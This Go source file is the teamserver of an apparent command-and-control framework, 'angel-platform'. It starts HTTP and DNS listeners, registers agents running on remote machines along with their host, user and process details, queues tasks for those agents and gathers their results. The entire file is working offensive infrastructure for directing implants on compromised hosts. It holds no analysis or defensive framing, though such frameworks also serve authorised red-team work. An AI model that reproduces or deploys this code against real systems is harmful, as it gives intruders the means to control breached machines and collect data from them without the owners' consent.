package c2server

import (
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/angel-platform/angel/pkg/eventbus"
	"github.com/angel-platform/angel/pkg/logger"
	"github.com/angel-platform/angel/pkg/types"
)

type Teamserver struct {
	mu        sync.RWMutex
	config    *TeamserverConfig
	agents    map[string]*types.Agent
	crypto    *ServerCrypto
	eb        *eventbus.EventBus
	log       *logger.Logger
	listeners *ListenerManager
	tasks     *TaskQueue
	running   bool
}

func NewTeamserver(config *TeamserverConfig) (*Teamserver, error) {
	if err := config.Validate(); err != nil {
		return nil, fmt.Errorf("invalid config: %w", err)
	}
	crypto, err := NewServerCrypto()
	if err != nil {
		return nil, fmt.Errorf("create crypto: %w", err)
	}
	eb := eventbus.New(config.CryptoKey)
	log := logger.New("teamserver", logger.LevelInfo)
	return &Teamserver{
		config:    config,
		agents:    make(map[string]*types.Agent),
		crypto:    crypto,
		eb:        eb,
		log:       log,
		listeners: NewListenerManager(log),
		tasks:     NewTaskQueue(),
	}, nil
}

func (ts *Teamserver) Start() error {
	ts.mu.Lock()
	ts.running = true
	ts.mu.Unlock()
	ts.log.Info("Starting teamserver on %s:%d", ts.config.BindAddr, ts.config.BindPort)
	httpListener := NewHTTPListener(
		ts.config.BindAddr,
		ts.config.BindPort,
		ts.crypto,
		ts.eb,
		ts.log,
	)
	ts.listeners.Add(httpListener)
	dnsListener := NewDNSListener(
		ts.config.BindAddr,
		ts.config.BindPort+1,
		ts.crypto,
		ts.eb,
		ts.log,
	)
	ts.listeners.Add(dnsListener)
	if err := ts.listeners.StartAll(); err != nil {
		return fmt.Errorf("start listeners: %w", err)
	}
	ts.log.Info("Teamserver started successfully")
	return nil
}

func (ts *Teamserver) Stop() {
	ts.mu.Lock()
	ts.running = false
	ts.mu.Unlock()
	ts.log.Info("Stopping teamserver...")
	ts.listeners.StopAll()
	ts.eb.Stop()
	ts.log.Info("Teamserver stopped")
}

func (ts *Teamserver) HandleRegistration(agentInfo []byte) (*types.Agent, error) {
	ts.mu.Lock()
	defer ts.mu.Unlock()
	if len(ts.agents) >= ts.config.MaxAgents {
		return nil, fmt.Errorf("max agents reached")
	}
	var info struct {
		Hostname string `json:"hostname"`
		IP       string `json:"ip"`
		OS       string `json:"os"`
		Arch     string `json:"arch"`
		User     string `json:"user"`
		PID      int    `json:"pid"`
		Process  string `json:"process"`
	}
	if err := json.Unmarshal(agentInfo, &info); err != nil {
		return nil, fmt.Errorf("parse agent info: %w", err)
	}
	agent := &types.Agent{
		ID:        types.GenerateID(),
		Hostname:  info.Hostname,
		IP:        info.IP,
		OS:        types.Platform(info.OS),
		Arch:      info.Arch,
		User:      info.User,
		PID:       info.PID,
		Process:   info.Process,
		LastCheck: time.Now(),
		FirstSeen: time.Now(),
		Metadata:  make(map[string]string),
	}
	ts.agents[agent.ID] = agent
	ts.eb.Publish("agent.registered", "teamserver", "registration", map[string]interface{}{
		"agent_id": agent.ID,
		"hostname": agent.Hostname,
	})
	ts.log.Info("Agent registered: %s (%s)", agent.ID, agent.Hostname)
	return agent, nil
}

func (ts *Teamserver) HandleCheckIn(agentID string) (*types.Task, error) {
	ts.mu.Lock()
	agent, exists := ts.agents[agentID]
	if !exists {
		ts.mu.Unlock()
		return nil, fmt.Errorf("unknown agent: %s", agentID)
	}
	agent.LastCheck = time.Now()
	ts.mu.Unlock()
	task, ok := ts.tasks.Dequeue(agentID)
	if !ok {
		return nil, nil
	}
	ts.eb.Publish("agent.checkin", "teamserver", "checkin", map[string]interface{}{
		"agent_id": agentID,
	})
	return task, nil
}

func (ts *Teamserver) HandleResult(agentID string, taskID string, result []byte) error {
	ts.mu.RLock()
	_, exists := ts.agents[agentID]
	ts.mu.RUnlock()
	if !exists {
		return fmt.Errorf("unknown agent: %s", agentID)
	}
	if err := ts.tasks.MarkComplete(taskID); err != nil {
		return fmt.Errorf("mark task complete: %w", err)
	}
	ts.eb.Publish("agent.result", "teamserver", "result", map[string]interface{}{
		"agent_id": agentID,
		"task_id":  taskID,
		"result":   string(result),
	})
	ts.log.Info("Result received from agent %s for task %s", agentID, taskID)
	return nil
}

func (ts *Teamserver) GetAgent(agentID string) (*types.Agent, bool) {
	ts.mu.RLock()
	defer ts.mu.RUnlock()
	agent, exists := ts.agents[agentID]
	return agent, exists
}

func (ts *Teamserver) GetAllAgents() []*types.Agent {
	ts.mu.RLock()
	defer ts.mu.RUnlock()
	agents := make([]*types.Agent, 0, len(ts.agents))
	for _, agent := range ts.agents {
		agents = append(agents, agent)
	}
	return agents
}

func (ts *Teamserver) SendTask(agentID string, task *types.Task) error {
	ts.mu.RLock()
	_, exists := ts.agents[agentID]
	ts.mu.RUnlock()
	if !exists {
		return fmt.Errorf("unknown agent: %s", agentID)
	}
	task.AgentID = agentID
	task.CreatedAt = time.Now()
	task.Status = types.TaskStatusPending
	if err := ts.tasks.Enqueue(agentID, task); err != nil {
		return fmt.Errorf("enqueue task: %w", err)
	}
	ts.eb.Publish("task.created", "teamserver", "task", map[string]interface{}{
		"agent_id": agentID,
		"task_id":  task.ID,
		"type":     task.Type,
	})
	ts.log.Info("Task %s queued for agent %s", task.ID, agentID)
	return nil
}

func (ts *Teamserver) GetTaskQueue() *TaskQueue {
	return ts.tasks
}

func (ts *Teamserver) GetListenerManager() *ListenerManager {
	return ts.listeners
}

func (ts *Teamserver) GetEventBus() *eventbus.EventBus {
	return ts.eb
}

func (ts *Teamserver) GetCrypto() *ServerCrypto {
	return ts.crypto
}

func (ts *Teamserver) IsRunning() bool {
	ts.mu.RLock()
	defer ts.mu.RUnlock()
	return ts.running
}
